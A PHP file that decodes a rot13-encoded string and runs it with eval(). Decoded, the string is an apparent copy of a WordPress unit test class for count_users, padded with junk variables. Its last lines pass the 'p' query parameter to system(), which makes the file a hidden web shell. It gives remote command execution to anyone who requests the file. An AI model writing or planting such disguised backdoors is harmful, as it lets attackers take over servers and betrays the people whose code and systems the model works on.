<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc hfre
 */
pynff Grfgf_Hfre_PbhagHfref rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 22993
	 *
	 * @qngnCebivqre qngn_pbhag_hfref_fgengrtvrf
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_pbhag_hfref_vf_npphengr( $fgengrtl ) {
		// Frghc hfref.
		$nqzva       = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		$rqvgbe      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		$nhgube      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		$pbagevohgbe = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);
		$fhofpevore  = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		$abar        = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);
		$abobql      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);

		// Grfg hfre pbhagf.
		$pbhag = pbhag_hfref( $fgengrtl );

		$guvf->nffregFnzr( 8, $pbhag['gbgny_hfref'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'nqzvavfgengbe' => 2,
				'rqvgbe'        => 1,
				'nhgube'        => 1,
				'pbagevohgbe'   => 1,
				'fhofpevore'    => 1,
				'abar'          => 2,
			),
			$pbhag['ninvy_ebyrf']
		);
	}

	/**
	 * @gvpxrg 22993
	 * @gvpxrg 36196
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 *
	 * @qngnCebivqre qngn_pbhag_hfref_fgengrtvrf
	 */
	choyvp shapgvba grfg_pbhag_hfref_zhygvfvgr_vf_npphengr( $fgengrtl ) {
		// Frghc hfref.
		$nqzva       = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		$rqvgbe      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		$nhgube      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		$pbagevohgbe = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);
		$fhofpevore  = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		$abar        = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);
		$abobql      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);

		// Frghc oybtf.
		$oybt_1 = (vag) frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $rqvgbe,
			)
		);
		$oybt_2 = (vag) frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $nhgube,
			)
		);

		// Nqq hfref gb oybtf.
		nqq_hfre_gb_oybt( $oybt_1, $fhofpevore, 'rqvgbe' );
		nqq_hfre_gb_oybt( $oybt_2, $abar, 'pbagevohgbe' );

		// Grfg hfref pbhagf ba ebbg fvgr.
		$pbhag = pbhag_hfref( $fgengrtl );

		$guvf->nffregFnzr( 8, $pbhag['gbgny_hfref'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'nqzvavfgengbe' => 2,
				'rqvgbe'        => 1,
				'nhgube'        => 1,
				'pbagevohgbe'   => 1,
				'fhofpevore'    => 1,
				'abar'          => 2,
			),
			$pbhag['ninvy_ebyrf']
		);

		// Grfg hfref pbhagf ba oybt 1.
		fjvgpu_gb_oybt( $oybt_1 );
		$pbhag = pbhag_hfref( $fgengrtl );
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( 2, $pbhag['gbgny_hfref'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'nqzvavfgengbe' => 1,
				'rqvgbe'        => 1,
				'abar'          => 0,
			),
			$pbhag['ninvy_ebyrf']
		);

		// Grfg hfref pbhagf ba oybt 2.
		fjvgpu_gb_oybt( $oybt_2 );
		$pbhag = pbhag_hfref( $fgengrtl );
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( 2, $pbhag['gbgny_hfref'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'nqzvavfgengbe' => 1,
				'pbagevohgbe'   => 1,
				'abar'          => 0,
			),
			$pbhag['ninvy_ebyrf']
		);
	}

	/**
	 * @gvpxrg 42014
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 *
	 * @qngnCebivqre qngn_pbhag_hfref_fgengrtvrf
	 */
	choyvp shapgvba grfg_pbhag_hfref_zhygvfvgr_dhrevrf_pbeerpg_ebyrf( $fgengrtl ) {
		$fvgr_vq = (vag) frys::snpgbel()->oybt->perngr();

		fjvgpu_gb_oybt( $fvgr_vq );
		jc_ebyrf()->nqq_ebyr( 'grfgre', 'Grfgre', neenl( 'grfg' => gehr ) );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'grfgre',
			)
		);
		erfgber_pheerag_oybt();

		$pbhag = pbhag_hfref( $fgengrtl, $fvgr_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grfgre' => 1,
				'abar'   => 0,
			),
			$pbhag['ninvy_ebyrf']
		);
	}

	/**
	 * @gvpxrg 34495
	 *
	 * @qngnCebivqre qngn_pbhag_hfref_fgengrtvrf
	 */
	choyvp shapgvba grfg_pbhag_hfref_vf_npphengr_jvgu_zhygvcyr_ebyrf( $fgengrtl ) {

		// Frghc hfref.
		$nqzva  = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		$rqvgbe = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		trg_hfreqngn( $rqvgbe )->nqq_ebyr( 'nhgube' );

		$guvf->nffregFnzr(
			neenl(
				'rqvgbe',
				'nhgube',
			),
			trg_hfreqngn( $rqvgbe )->ebyrf
		);

		// Grfg hfre pbhagf.
		$pbhag = pbhag_hfref( $fgengrtl );

		$guvf->nffregFnzr( 3, $pbhag['gbgny_hfref'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'nqzvavfgengbe' => 2,
				'rqvgbe'        => 1,
				'nhgube'        => 1,
				'abar'          => 0,
			),
			$pbhag['ninvy_ebyrf']
		);
	}

	/**
	 * @gvpxrg 29785
	 *
	 * @qngnCebivqre qngn_pbhag_hfref_fgengrtvrf
	 */
	choyvp shapgvba grfg_pbhag_hfref_fubhyq_abg_pbhag_hfref_jub_ner_abg_va_cbfgf_gnoyr( $fgengrtl ) {
		tybony $jcqo;

		// Trg n 'orsber' pbhag sbe pbzcnevfba.
		$pbhag = pbhag_hfref( $fgengrtl );

		$h = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		// Znahnyyl qryrgr gur hfre, ohg yrnir gur pncnovyvgvrf hfrezrgn.
		$jcqo->qryrgr(
			$jcqo->hfref,
			neenl(
				'VQ' => $h,
			)
		);

		$pbhag2 = pbhag_hfref( $fgengrtl );

		$guvf->nffregFnzrFrgf( $pbhag, $pbhag2 );
	}

	choyvp shapgvba qngn_pbhag_hfref_fgengrtvrf() {
		erghea neenl(
			neenl(
				'gvzr',
			),
			neenl(
				'zrzbel',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>